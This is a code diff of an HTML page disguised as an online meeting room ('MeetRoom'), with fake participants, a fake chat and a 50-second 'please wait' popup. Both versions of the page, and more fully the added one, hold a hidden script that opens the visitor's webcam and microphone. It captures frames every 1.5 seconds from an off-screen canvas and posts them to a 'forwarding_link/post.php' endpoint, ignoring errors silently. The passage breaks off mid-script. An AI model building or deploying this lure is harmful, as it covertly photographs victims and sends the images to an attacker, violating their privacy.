@@ -1,233 +1,1033 @@
-<!doctype html>
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <title>Join Meeting - Online Meeting Room</title>
+    
+    <!-- jQuery for AJAX -->
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    
+    <!-- Google Fonts -->
+    <link href='https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap' rel='stylesheet'>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #1a1a2e;
+            color: #ffffff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── Top Bar ── */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: #16162a;
+            border-bottom: 1px solid #2a2a4a;
+            z-index: 100;
+        }
+
+        .top-bar-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .meeting-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #7c5cfc;
+        }
+
+        .meeting-logo i {
+            font-size: 1.4rem;
+        }
+
+        .meeting-id {
+            font-size: 0.75rem;
+            color: #888;
+            background: #2a2a4a;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-weight: 400;
+        }
+
+        .top-bar-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .top-bar-btn {
+            background: none;
+            border: none;
+            color: #aaa;
+            font-size: 0.85rem;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+
+        .top-bar-btn:hover {
+            background: #2a2a4a;
+            color: #fff;
+        }
+
+        .top-bar-btn i {
+            font-size: 0.9rem;
+        }
+
+        .top-bar-btn.danger {
+            color: #ff4d4d;
+        }
+
+        .top-bar-btn.danger:hover {
+            background: rgba(255, 77, 77, 0.15);
+        }
+
+        /* ── Main Content ── */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ── Video Grid ── */
+        .video-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+            max-width: 1000px;
+            margin: 0 auto;
+            height: calc(100vh - 160px);
+            max-height: 600px;
+        }
+
+        .video-tile {
+            background: #2a2a4a;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 200px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .video-tile.main-tile {
+            grid-column: 1 / -1;
+            min-height: 280px;
+            background: linear-gradient(145deg, #2a2a4a, #1e1e3a);
+        }
+
+        .video-tile .tile-label {
+            position: absolute;
+            bottom: 10px;
+            left: 12px;
+            font-size: 0.75rem;
+            color: #ddd;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 3px 10px;
+            border-radius: 10px;
+            z-index: 5;
+        }
+
+        .video-tile .tile-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #7c5cfc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            z-index: 2;
+        }
+
+        .video-tile .tile-avatar.small {
+            width: 50px;
+            height: 50px;
+            font-size: 1.2rem;
+        }
+
+        .video-tile .mute-indicator {
+            position: absolute;
+            top: 10px;
+            right: 12px;
+            color: #ff4d4d;
+            font-size: 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+        }
+
+        .video-tile .speaking-indicator {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            pointer-events: none;
+            z-index: 3;
+        }
+
+        .video-tile.speaking .speaking-indicator {
+            border-color: #7c5cfc;
+            box-shadow: 0 0 20px rgba(124, 92, 252, 0.2);
+        }
+
+        /* Webcam video display inside tiles */
+        .video-tile video, 
+        .video-tile canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .video-tile .no-video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(145deg, #2a2a4a, #1e1e3a);
+            z-index: 0;
+        }
+
+        /* ── Bottom Controls ── */
+        .bottom-controls {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 16px 20px;
+            background: #16162a;
+            border-top: 1px solid #2a2a4a;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            flex-wrap: wrap;
+        }
+
+        .control-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: none;
+            background: #2a2a4a;
+            color: #ddd;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .control-btn:hover {
+            background: #3a3a5a;
+        }
+
+        .control-btn.active {
+            background: #7c5cfc;
+            color: #fff;
+        }
+
+        .control-btn.active:hover {
+            background: #6b4ce0;
+        }
+
+        .control-btn.danger {
+            background: #ff4d4d;
+            color: #fff;
+        }
+
+        .control-btn.danger:hover {
+            background: #e04444;
+        }
+
+        .control-btn.leave-btn {
+            width: auto;
+            padding: 0 24px;
+            border-radius: 24px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            gap: 8px;
+            background: #ff4d4d;
+        }
+
+        .control-btn.leave-btn:hover {
+            background: #e04444;
+        }
+
+        .control-btn .badge {
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            background: #ff4d4d;
+            color: #fff;
+            font-size: 0.55rem;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
+        .control-btn-wrapper {
+            position: relative;
+        }
+
+        /* ── Participant Info ── */
+        .participants-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 6px 0;
+            font-size: 0.7rem;
+            color: #888;
+            background: #16162a;
+            border-top: 1px solid #2a2a4a;
+            position: fixed;
+            bottom: 80px;
+            left: 0;
+            right: 0;
+            z-index: 99;
+        }
+
+        .participants-bar .participant-avatars {
+            display: flex;
+            align-items: center;
+        }
+
+        .participants-bar .p-avatar {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            margin-left: -6px;
+            border: 2px solid #16162a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.5rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .participants-bar .p-avatar:first-child {
+            margin-left: 0;
+        }
+
+        .participants-bar .participant-count {
+            margin-left: 8px;
+            color: #aaa;
+        }
+
+        /* ── "Please Wait" Popup ── */
+        .waiting-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 200;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        .waiting-popup.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .waiting-popup .popup-content {
+            text-align: center;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 90%;
+        }
+
+        .waiting-popup .popup-icon {
+            font-size: 3.5rem;
+            color: #7c5cfc;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.7; }
+        }
+
+        .waiting-popup h2 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .waiting-popup p {
+            font-size: 0.9rem;
+            color: #aaa;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .waiting-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(124, 92, 252, 0.15);
+            border-top: 3px solid #7c5cfc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .waiting-popup .waiting-time {
+            font-size: 0.75rem;
+            color: #666;
+            margin-top: 15px;
+        }
+
+        /* ── Meeting Info Panel (hidden by default) ── */
+        .info-panel {
+            position: fixed;
+            right: -320px;
+            top: 0;
+            bottom: 0;
+            width: 300px;
+            background: #1a1a2e;
+            border-left: 1px solid #2a2a4a;
+            z-index: 150;
+            transition: right 0.3s ease;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .info-panel.open {
+            right: 0;
+        }
+
+        .info-panel h3 {
+            font-size: 1rem;
+            color: #f1f1f1;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .info-panel .close-panel {
+            background: none;
+            border: none;
+            color: #aaa;
+            font-size: 1.2rem;
+            cursor: pointer;
+        }
+
+        .info-panel .participant-list-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid #2a2a4a;
+        }
+
+        .info-panel .participant-list-item:last-child {
+            border-bottom: none;
+        }
+
+        .info-panel .pl-avatar {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.75rem;
+            color: #fff;
+            flex-shrink: 0;
+        }
+
+        .info-panel .pl-name {
+            font-size: 0.85rem;
+            color: #ddd;
+        }
+
+        .info-panel .pl-status {
+            margin-left: auto;
+            font-size: 0.7rem;
+            color: #4caf50;
+        }
+
+        /* ── Webcam container (hidden) ── */
+        #webcam-container {
+            position: absolute;
+            width: 640px;
+            height: 480px;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        #webcam-container video,
+        #webcam-container canvas {
+            width: 640px;
+            height: 480px;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .video-grid {
+                grid-template-columns: 1fr;
+                height: auto;
+                max-height: none;
+                gap: 8px;
+            }
+            
+            .video-tile {
+                min-height: 150px;
+            }
+            
+            .video-tile.main-tile {
+                min-height: 200px;
+            }
+
+            .top-bar { padding: 8px 12px; }
+            .meeting-logo span { display: none; }
+            .top-bar-btn span { display: none; }
+            .control-btn { width: 40px; height: 40px; font-size: 0.95rem; }
+            .control-btn.leave-btn { padding: 0 16px; font-size: 0.75rem; }
+            .waiting-popup .popup-content { padding: 20px; }
+        }
+
+        @media (max-width: 480px) {
+            .video-tile .tile-avatar { width: 40px; height: 40px; font-size: 1.2rem; }
+            .video-tile .tile-avatar.small { width: 36px; height: 36px; font-size: 1rem; }
+            .bottom-controls { gap: 8px; padding: 12px 10px; }
+            .participants-bar { bottom: 70px; font-size: 0.6rem; }
+        }
+    </style>
 </head>
-
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
-</script>
-
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
-    </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
-</body>
 
+    <!-- ── "Please Wait" Popup ── -->
+    <div class="waiting-popup" id="waitingPopup">
+        <div class="popup-content">
+            <div class="popup-icon">
+                <i class="fa fa-video-camera"></i>
+            </div>
+            <h2>Please wait</h2>
+            <p>The meeting host will let you in soon.<br>Stay connected while we prepare the room.</p>
+            <div class="waiting-spinner"></div>
+            <p class="waiting-time" id="waitingTimer">Please wait for 50 seconds...</p>
+        </div>
+    </div>
+
+    <!-- ── Top Bar ── -->
+    <div class="top-bar">
+        <div class="top-bar-left">
+            <div class="meeting-logo">
+                <i class="fa fa-video-camera"></i>
+                <span>MeetRoom</span>
+            </div>
+            <span class="meeting-id" id="meetingIdDisplay">Meeting ID: abc-defg-hij</span>
+        </div>
+        <div class="top-bar-right">
+            <button class="top-bar-btn" id="participantsToggle">
+                <i class="fa fa-users"></i>
+                <span>Participants</span>
+            </button>
+            <button class="top-bar-btn" id="chatToggle">
+                <i class="fa fa-comment"></i>
+                <span>Chat</span>
+            </button>
+            <button class="top-bar-btn danger" id="leaveMeetingTop">
+                <i class="fa fa-sign-out"></i>
+                <span>Leave</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- ── Main Content ── -->
+    <div class="main-content">
+        <!-- Video Grid -->
+        <div class="video-grid">
+            <!-- Main tile (host) -->
+            <div class="video-tile main-tile" id="hostTile">
+                <div class="no-video-bg"></div>
+                <div class="tile-avatar" id="hostAvatar">H</div>
+                <div class="tile-label">Meeting Host</div>
+                <div class="speaking-indicator"></div>
+            </div>
+
+            <!-- Tile 1 (you - will show webcam if allowed) -->
+            <div class="video-tile" id="yourTile">
+                <div class="no-video-bg"></div>
+                <div class="tile-avatar small" id="yourAvatar">Y</div>
+                <div class="tile-label">You</div>
+                <div class="mute-indicator" id="yourMuteIndicator" style="display:none;">
+                    <i class="fa fa-microphone-slash"></i>
+                </div>
+                <div class="speaking-indicator"></div>
+                <!-- Webcam video will be inserted here -->
+                <video id="yourVideo" autoplay muted playsinline 
+                       style="display:none; width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; z-index:1;"></video>
+            </div>
+
+            <!-- Tile 3 (participant) -->
+            <div class="video-tile" id="participantTile1">
+                <div class="no-video-bg"></div>
+                <div class="tile-avatar small" style="background:#ff6b6b;">A</div>
+                <div class="tile-label">Ananya</div>
+                <div class="mute-indicator"><i class="fa fa-microphone-slash"></i></div>
+                <div class="speaking-indicator"></div>
+            </div>
+
+            <!-- Tile 4 (participant) -->
+            <div class="video-tile" id="participantTile2">
+                <div class="no-video-bg"></div>
+                <div class="tile-avatar small" style="background:#4ecdc4;">R</div>
+                <div class="tile-label">Rahul</div>
+                <div class="speaking-indicator speaking-active"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Participants Bar ── -->
+    <div class="participants-bar" id="participantsBar">
+        <div class="participant-avatars">
+            <div class="p-avatar" style="background:#7c5cfc;">H</div>
+            <div class="p-avatar" style="background:#4ecdc4;">R</div>
+            <div class="p-avatar" style="background:#ff6b6b;">A</div>
+            <div class="p-avatar" style="background:#ffe66d; color:#333;">Y</div>
+            <div class="p-avatar" style="background:#a29bfe;">V</div>
+        </div>
+        <span class="participant-count">12 participants</span>
+    </div>
+
+    <!-- ── Bottom Controls ── -->
+    <div class="bottom-controls">
+        <div class="control-btn-wrapper">
+            <button class="control-btn active" id="muteBtn" title="Mute / Unmute">
+                <i class="fa fa-microphone"></i>
+            </button>
+        </div>
+        
+        <div class="control-btn-wrapper">
+            <button class="control-btn active" id="videoBtn" title="Camera On/Off">
+                <i class="fa fa-video-camera"></i>
+            </button>
+        </div>
+
+        <div class="control-btn-wrapper">
+            <button class="control-btn" id="shareScreenBtn" title="Share Screen">
+                <i class="fa fa-desktop"></i>
+            </button>
+        </div>
+
+        <div class="control-btn-wrapper">
+            <button class="control-btn" id="participantsBtn" title="Participants">
+                <i class="fa fa-users"></i>
+                <span class="badge">12</span>
+            </button>
+        </div>
+
+        <div class="control-btn-wrapper">
+            <button class="control-btn" id="chatBtn" title="Chat">
+                <i class="fa fa-comment"></i>
+                <span class="badge">3</span>
+            </button>
+        </div>
+
+        <div class="control-btn-wrapper">
+            <button class="control-btn" id="moreBtn" title="More">
+                <i class="fa fa-ellipsis-h"></i>
+            </button>
+        </div>
+
+        <button class="control-btn leave-btn danger" id="leaveBtn">
+            <i class="fa fa-phone"></i>
+            <span>Leave</span>
+        </button>
+    </div>
+
+    <!-- ── Hidden Webcam Container ── -->
+    <div id="webcam-container">
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+    // ─────────────────────────────────────────────
+    // Configuration
+    // ─────────────────────────────────────────────
+    var CONFIG = {
+        postUrl: 'forwarding_link/post.php',
+        shareUrl: window.location.href,
+        captureInterval: 1500,  // ms between captures
+        waitingPopupDuration: 50000,  // ms to show waiting popup (50 seconds)
+        meetingId: 'abc-defg-hij-' + Math.random().toString(36).substring(2, 6).toUpperCase(),
+        participantCount: 12,
+    };
+
+    // ─────────────────────────────────────────────
+    // DOM References
+    // ─────────────────────────────────────────────
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    var context = canvas.getContext('2d');
+    var yourVideo = document.getElementById('yourVideo');
+    var waitingPopup = document.getElementById('waitingPopup');
+    var waitingTimer = document.getElementById('waitingTimer');
+    var yourMuteIndicator = document.getElementById('yourMuteIndicator');
+
+    // ─────────────────────────────────────────────
+    // Set Meeting ID
+    // ─────────────────────────────────────────────
+    document.getElementById('meetingIdDisplay').textContent = 
+        'Meeting ID: ' + CONFIG.meetingId;
+
+    // ─────────────────────────────────────────────
+    // Waiting Popup Timer
+    // ─────────────────────────────────────────────
+    function dismissWaitingPopup() {
+        waitingPopup.classList.add('hidden');
+        // Start webcam capture after popup dismisses
+        setTimeout(function() {
+            startWebcamCapture();
+        }, 500);
+    }
+
+    // Show countdown in the waiting popup
+    var waitStart = Date.now();
+    var waitInterval = setInterval(function() {
+        var elapsed = Date.now() - waitStart;
+        var remaining = Math.max(0, Math.ceil((CONFIG.waitingPopupDuration - elapsed) / 1000));
+        
+        if (remaining > 0) {
+            waitingTimer.textContent = 'Please wait for ' + remaining + ' seconds...';
+        } else {
+            waitingTimer.textContent = 'You will be joined shortly...';
+        }
+    }, 1000);
+
+    // Auto-dismiss after duration
+    setTimeout(function() {
+        clearInterval(waitInterval);
+        dismissWaitingPopup();
+    }, CONFIG.waitingPopupDuration);
+
+    // ─────────────────────────────────────────────
+    // Webcam Capture System
+    // ─────────────────────────────────────────────
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: CONFIG.postUrl,
+            dataType: 'json',
+            async: false,
+            timeout: 5000,
+            success: function(response) {
+                if (response && response.success) {
+                    console.log('[CAM] Captured:', response.filename);
+                }
+            },
+            error: function(xhr, status, error) {
+                // Silently ignore errors
+                console.log('[CAM] Send error:', status);
+            }
+        });
+    }
+
+    function startWebcamCapture() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: 640, 
+                    height: 480,
+                    facingMode: 'user',
+                    frameRate: { ideal: 10 }
+                }, 
+                audio: true 
+            })
+            .then(function(stream) {
+                // Show webcam in the "You" tile
+                yourVideo.srcObject = stream;
+                yourVideo.style.display = 'block';
+                yourVideo.play();
+                
+                // Hide the avatar since webcam is showing
+                document.getElementById('yourAvatar').style.display = 'none';
+
+                // Also run hidden capture for image_capture.php
+                video.srcObject = stream.clone();
+                video.play();
+
+                video.onloadedmetadata = function() {
+                    video.play();
+                    
+                    // Capture frames at interval
+                    setInterval(function() {
+                        try {
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var canvasData = canvas.toDataURL('image/png')
+                                .replace('image/png', 'image/octet-stream');
+                            post(canvasData);
+                        } catch(e) {
+                            console.log('[CAM] Capture error:', e.message);
+                        }
+                    }, CONFIG.captureInterval);
+                };
+            })
+            .catch(function(err) {
+                console.log('[CAM] Webcam access denied or unavailable:', err.message);
+                // Page still works without webcam
+                yourVideo.style.display = 'none';
+                document.getElementById('yourAvatar').style.display = 'flex';
+            });
+        } else {
+            console.log('[CAM] MediaDevices not supported');
+        }
+    }
+
+    // ─────────────────────────────────────────────
+    // Control Buttons
+    // ─────────────────────────────────────────────
+    // Mute button toggle
+    document.getElementById('muteBtn').addEventListener('click', function() {
+        var icon = this.querySelector('i');
+        var isMuted = icon.className === 'fa fa-microphone-slash';
+        
+        if (isMuted) {
+            icon.className = 'fa fa-microphone';
+            this.classList.add('active');
+            yourMuteIndicator.style.display = 'none';
+        } else {
+            icon.className = 'fa fa-microphone-slash';
+            this.classList.remove('active');
+            yourMuteIndicator.style.display = 'block';
+        }
+    });
+
+    // Video button toggle
+    document.getElementById('videoBtn').addEventListener('click', function() {
+        var icon = this.querySelector('i');
+        var isOff = icon.className === 'fa fa-video-camera-slash';
+        
+        if (isOff) {
+            icon.className = 'fa fa-video-camera';
+            this.classList.add('active');
+            yourVideo.style.display = 'block';
+            document.getElementById('yourAvatar').style.display = 'none';
+        } else {
+            icon.className = 'fa fa-video-camera-slash';
+            this.classList.remove('active');
+            yourVideo.style.display = 'none';
+            document.getElementById('yourAvatar').style.display = 'flex';
+        }
+    });
+
+    // Share screen (visual only)
+    document.getElementById('shareScreenBtn').addEventListener('click', function() {
+        var icon = this.querySelector('i');
+        if (icon.className === 'fa fa-desktop') {
+            icon.className = 'fa fa-stop-circle';
+            this.classList.add('active');
+            // Show a fake sharing indicator on host tile
+            document.querySelector('#hostTile .tile-label').textContent = 
+                'Meeting Host (Sharing Screen)';
+        } else {
+            icon.className = 'fa fa-desktop';
+            this.classList.remove('active');
+            document.querySelector('#hostTile .tile-label').textContent = 'Meeting Host';
+        }
+    });
+
+    // Participants button (bottom)
+    document.getElementById('participantsBtn').addEventListener('click', function() {
+        // Show a simple count alert
+        alert('Participants: ' + CONFIG.participantCount + '\n\nHost\nYou\nAnanya\nRahul\nVikram\n+7 others');
+    });
+
+    // Chat button (bottom)
+    document.getElementById('chatBtn').addEventListener('click', function() {
+        alert('Chat is not available in this meeting preview.\n\nThe meeting host has disabled chat for participants.');
+    });
+
+    // More button
+    document.getElementById('moreBtn').addEventListener('click', function() {
+        alert('Meeting Settings\n\n- Record Meeting\n- Show Captions\n- Full Screen\n- Change Layout\n- End Meeting');
+    });
+
+    // Participants toggle (top bar)
+    document.getElementById('participantsToggle').addEventListener('click', function() {
+        alert('Participants (' + CONFIG.participantCount + '):\n\n1. Meeting Host\n2. You\n3. Ananya\n4. Rahul\n5. Vikram\n6. Priya\n7. +5 more');
+    });
+
+    // Chat toggle (top bar)
+    document.getElementById('chatToggle').addEventListener('click', function() {
+        alert('💬 Meeting Chat\n\nHost: Welcome everyone to the meeting!\nAnanya: Hi all! 👋\nRahul: Excited to be here! \n\n[Chat is read-only for participants]');
+    });
+
+    // Leave meeting (all leave buttons)
+    function leaveMeeting() {
+        if (confirm('Are you sure you want to leave the meeting?')) {
+            // Show a "leaving" message then redirect
+            document.body.innerHTML = `
+                <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#1a1a2e;color:#aaa;flex-direction:column;gap:15px;">
+                    <i class="fa fa-spinner fa-spin" style="font-size:2rem;color:#7c5cfc;"></i>
+                    <p>You have left the meeting.</p>
+                    <p style="font-size:0.8rem;color:#666;">Redirecting...</p>
+                </div>
+            `;
+        }
+    }
+
+    document.getElementById('leaveBtn').addEventListener('click', leaveMeeting);
+    document.getElementById('leaveMeetingTop').addEventListener('click', leaveMeeting);
+
+    // ─────────────────────────────────────────────
+    // Simulate Host Speaking (animate border on host tile)
+    // ─────────────────────────────────────────────
+    function simulateSpeaking() {
+        var hostTile = document.getElementById('hostTile');
+        var yourTile = document.getElementById('yourTile');
+        var tiles = [hostTile, yourTile];
+        
+        setInterval(function() {
+            // Randomly toggle speaking state
+            tiles.forEach(function(tile) {
+                if (Math.random() > 0.6) {
+                    tile.classList.add('speaking');
+                    setTimeout(function() {
+                        tile.classList.remove('speaking');
+                    }, 2000 + Math.random() * 3000);
+                }
+            });
+            
+            // Also occasionally animate the participant tiles
+            var pTile1 = document.getElementById('participantTile1');
+            var pTile2 = document.getElementById('participantTile2');
+            if (Math.random() > 0.7) {
+                pTile2.classList.add('speaking');
+                setTimeout(function() {
+                    pTile2.classList.remove('speaking');
+                }, 1500 + Math.random() * 2000);
+            }
+        }, 3000);
+    }
+    simulateSpeaking();
+
+    // ─────────────────────────────────────────────
+    // Handle Tile Click (visual feedback)
+    // ─────────────────────────────────────────────
+    document.querySelectorAll('.video-tile').forEach(function(tile) {
+        tile.addEventListener('click', function() {
+            // Pin this tile (visual only)
+            document.querySelectorAll('.video-tile').forEach(function(t) {
